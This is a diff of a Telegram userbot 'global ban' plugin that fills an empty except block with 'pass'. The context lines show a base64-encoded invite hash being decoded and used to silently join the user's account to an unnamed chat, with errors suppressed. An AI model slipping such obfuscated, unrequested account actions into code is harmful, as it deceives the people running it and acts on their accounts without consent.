@@ -126,7 +126,7 @@ async def global_ban(event):
         hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         await event.client(ImportChatInviteRequest(hmm))
     except BaseException:
-
+        pass
     if gban_sql.is_gbanned(user.id):
         await event.edit(
             f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again"
